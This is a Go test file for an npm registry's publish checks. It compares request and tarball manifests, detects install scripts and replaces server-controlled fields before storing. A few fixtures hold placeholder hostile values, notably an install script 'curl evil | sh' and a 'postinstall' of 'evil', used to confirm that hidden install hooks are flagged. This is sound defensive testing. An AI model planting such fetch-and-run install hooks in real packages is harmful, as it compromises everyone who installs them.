package manifest

import (
	"reflect"
	"strings"
	"testing"
)

func TestMismatches(t *testing.T) {
	gyp := Facts{Files: []string{"binding.gyp"}}
	cases := []struct {
		name            string
		request, packed string
		facts           Facts
		want            []string
	}{
		{"equal", `{"dependencies":{"a":"1"}}`, `{"dependencies":{"a":"1"}}`, Facts{}, nil},
		{"a dependency the request omits", `{"name":"x"}`, `{"dependencies":{"a":"1"}}`, Facts{}, []string{"dependencies"}},
		{"a dependency the request adds", `{"dependencies":{"a":"1","b":"1"}}`, `{"dependencies":{"a":"1"}}`, Facts{}, []string{"dependencies"}},
		{"another range", `{"dependencies":{"a":"^1"}}`, `{"dependencies":{"a":"^2"}}`, Facts{}, []string{"dependencies"}},
		{"optional dependencies", `{"optionalDependencies":{"a":"1"}}`, `{}`, Facts{}, []string{"optionalDependencies"}},
		{"peer dependencies", `{}`, `{"peerDependencies":{"a":"1"}}`, Facts{}, []string{"peerDependencies"}},
		{"peer dependencies meta", `{"peerDependenciesMeta":{"a":{"optional":true}}}`, `{}`, Facts{}, []string{"peerDependenciesMeta"}},
		{"bundle dependencies", `{}`, `{"bundleDependencies":["a"]}`, Facts{}, []string{"dependencies", "bundleDependencies"}},
		{"bin", `{"name":"x","bin":"a.js"}`, `{"name":"x","bin":"b.js"}`, Facts{}, []string{"bin"}},
		{"os", `{"os":["linux"]}`, `{"os":["darwin"]}`, Facts{}, []string{"os"}},
		{"cpu", `{"cpu":["x64"]}`, `{}`, Facts{}, []string{"cpu"}},
		{"engines", `{"engines":{"node":">=18"}}`, `{"engines":{"node":">=10"}}`, Facts{}, []string{"engines"}},
		{"a postinstall script the request omits", `{"scripts":{"test":"t"}}`, `{"scripts":{"test":"t","postinstall":"evil"}}`, Facts{}, []string{"scripts.postinstall"}},
		{"preinstall and install", `{"scripts":{"preinstall":"a","install":"b"}}`, `{"scripts":{"preinstall":"c"}}`, Facts{}, []string{"scripts.preinstall", "scripts.install"}},
		{"other scripts are not compared", `{"scripts":{"test":"a","build":"b"}}`, `{"scripts":{"test":"c"}}`, Facts{}, nil},
		{"fields that are not compared", `{"description":"a","main":"x","files":["a"]}`, `{"description":"b"}`, Facts{}, nil},
		{"empty equals absent", `{"dependencies":{},"os":[],"engines":null,"scripts":{}}`, `{}`, Facts{}, nil},
		{"v-prefixed version needs no field", `{"version":"v1.0.0"}`, `{"version":"1.0.0"}`, Facts{}, nil},
		{"the node-gyp script the client added", `{"scripts":{"install":"node-gyp rebuild"}}`, `{}`, gyp, nil},
		{"the node-gyp script the tarball needs is not hidden", `{}`, `{"scripts":{"install":"curl evil | sh"}}`, gyp, []string{"scripts.install"}},
		{"bin string against object", `{"name":"@a/b","bin":"c.js"}`, `{"name":"@a/b","bin":{"b":"./c.js"}}`, Facts{}, nil},
		{"bundledDependencies against bundleDependencies", `{"dependencies":{"a":"1"},"bundleDependencies":["a"]}`, `{"dependencies":{"a":"1"},"bundledDependencies":true}`, Facts{}, nil},
	}
	for _, c := range cases {
		t.Run("R-NPM-007 step 3 "+c.name, func(t *testing.T) {
			got := Mismatches(mustParse(t, c.request), mustParse(t, c.packed), c.facts)
			if !reflect.DeepEqual(got, c.want) {
				t.Fatalf("Mismatches = %v, want %v", got, c.want)
			}
			// the comparison is symmetric
			rev := Mismatches(mustParse(t, c.packed), mustParse(t, c.request), c.facts)
			if len(rev) != len(c.want) {
				t.Fatalf("reversed: %v, want as many as %v", rev, c.want)
			}
		})
	}
}

func TestCheckConsistency(t *testing.T) {
	t.Run("R-NPM-007 a request that omits a dependency of the tarball answers 400 npm_manifest_mismatch", func(t *testing.T) {
		err := CheckConsistency(mustParse(t, `{"name":"x"}`), mustParse(t, `{"name":"x","dependencies":{"left-pad":"1"}}`), Facts{})
		wantError(t, err, 400, CodeManifestMismatch)
		if !strings.Contains(err.Error(), "dependencies") {
			t.Fatalf("the error does not name the field: %v", err)
		}
	})
	t.Run("R-NPM-007 equal manifests pass", func(t *testing.T) {
		m := mustParse(t, `{"name":"x","dependencies":{"a":"1"}}`)
		if err := CheckConsistency(m, m.Clone(), Facts{}); err != nil {
			t.Fatal(err)
		}
	})
	t.Run("R-NPM-007 the inputs are not modified", func(t *testing.T) {
		req, pkg := mustParse(t, `{"bin":"x.js","name":"n","bundledDependencies":true}`), mustParse(t, `{"name":"n"}`)
		before := jsonOf(t, req)
		_ = CheckConsistency(req, pkg, Facts{})
		if jsonOf(t, req) != before {
			t.Fatal("the request manifest changed")
		}
	})
}

func TestCheckIdentity(t *testing.T) {
	cases := []struct {
		name, packed, wantName, wantVersion string
		ok                                  bool
	}{
		{"equal", `{"name":"@acme/ui","version":"1.2.0"}`, "@acme/ui", "1.2.0", true},
		{"v-prefixed and padded in the tarball", `{"name":" @acme/ui ","version":"v1.2.0"}`, "@acme/ui", "1.2.0", true},
		{"cleaned request version", `{"name":"a","version":"1.2.0"}`, "a", "=1.2.0", true},
		{"another name", `{"name":"b","version":"1.2.0"}`, "a", "1.2.0", false},
		{"another version", `{"name":"a","version":"1.2.1"}`, "a", "1.2.0", false},
		{"build metadata is dropped on both sides", `{"name":"a","version":"1.2.0+x"}`, "a", "1.2.0+y", true},
		{"missing version", `{"name":"a"}`, "a", "1.2.0", false},
		{"name that is not a string", `{"name":5,"version":"1.0.0"}`, "5", "1.0.0", false},
	}
	for _, c := range cases {
		t.Run("R-NPM-007 step 3 "+c.name, func(t *testing.T) {
			err := CheckIdentity(mustParse(t, c.packed), c.wantName, c.wantVersion)
			if c.ok {
				if err != nil {
					t.Fatal(err)
				}
				return
			}
			wantError(t, err, 400, CodeManifestMismatch)
		})
	}
}

func TestHasInstallScript(t *testing.T) {
	cases := []struct {
		name, doc string
		facts     Facts
		want      bool
	}{
		{"none", `{"scripts":{"test":"t"}}`, Facts{}, false},
		{"preinstall", `{"scripts":{"preinstall":"x"}}`, Facts{}, true},
		{"install", `{"scripts":{"install":"x"}}`, Facts{}, true},
		{"postinstall", `{"scripts":{"postinstall":"x"}}`, Facts{}, true},
		{"empty script", `{"scripts":{"install":""}}`, Facts{}, false},
		{"binding.gyp", `{}`, Facts{Files: []string{"binding.gyp"}}, true},
		{"nested binding.gyp", `{}`, Facts{Files: []string{"src/binding.gyp"}}, false},
	}
	for _, c := range cases {
		t.Run("R-NPM-007 "+c.name, func(t *testing.T) {
			if got := HasInstallScript(mustParse(t, c.doc), c.facts); got != c.want {
				t.Fatalf("got %v", got)
			}
		})
	}
}

func TestStored(t *testing.T) {
	req := mustParse(t, `{
	  "_id": "evil@9.9.9", "_rev": "3-x", "_revisions": {}, "_attachments": {"a": {}}, "_npmUser": {"name": "mallory", "email": "m@x", "trustedPublisher": {"id": "gh"}},
	  "_npmOperationalInternal": {"host": "h"}, "_nodeVersion": "22.0.0", "_npmVersion": "11.0.0", "_custom": 1, "_hasShrinkwrap": true,
	  "name": "@acme/ui", "version": "1.2.0", "hasInstallScript": true, "access": "public", "description": "d",
	  "dist": {"tarball": "http://x/t.tgz", "signatures": [{"sig": "s"}], "attestations": {"url": "u"}, "integrity": "sha512-wrong", "shasum": "wrong", "fileCount": 1, "unpackedSize": 2, "extra": "kept"}
	}`)
	before := jsonOf(t, req)
	got := Stored(req, ServerFields{
		Name: "@acme/ui", Version: "1.2.0", Principal: "alice", Integrity: "sha512-abc", Shasum: "def",
		FileCount: 7, UnpackedSize: 1234, HasInstallScript: false, HasShrinkwrap: false,
	})
	t.Run("R-NPM-007 stored manifest: server-controlled fields are replaced", func(t *testing.T) {
		want := mustParse(t, `{
		  "_id": "@acme/ui@1.2.0", "_npmUser": {"name": "alice"}, "_nodeVersion": "22.0.0", "_npmVersion": "11.0.0", "_hasShrinkwrap": false,
		  "name": "@acme/ui", "version": "1.2.0", "access": "public", "description": "d",
		  "dist": {"integrity": "sha512-abc", "shasum": "def", "fileCount": 7, "unpackedSize": 1234, "extra": "kept"}
		}`)
		if jsonOf(t, got) != jsonOf(t, want) {
			t.Fatalf("\n got  %s\n want %s", jsonOf(t, got), jsonOf(t, want))
		}
	})
	t.Run("R-NPM-007 stored manifest: the request is not modified", func(t *testing.T) {
		if jsonOf(t, req) != before {
			t.Fatal("the request manifest changed")
		}
	})
	t.Run("R-NPM-007 stored manifest: hasInstallScript and _hasShrinkwrap come from the tarball", func(t *testing.T) {
		got := Stored(mustParse(t, `{}`), ServerFields{Name: "a", Version: "1.0.0", Principal: "p", Integrity: "sha512-x", HasInstallScript: true, HasShrinkwrap: true})
		if got["hasInstallScript"] != true || got["_hasShrinkwrap"] != true || got["_id"] != "a@1.0.0" {
			t.Fatalf("got %s", jsonOf(t, got))
		}
	})
	t.Run("R-NPM-007 stored manifest: a request without dist gets one", func(t *testing.T) {
		got := Stored(nil, ServerFields{Name: "a", Version: "1.0.0", Shasum: "s"})
		dist, _ := got["dist"].(map[string]any)
		if dist["shasum"] != "s" {
			t.Fatalf("got %s", jsonOf(t, got))
		}
		if _, has := dist["integrity"]; has {
			t.Fatal("an empty integrity was stored")
		}
	})
}
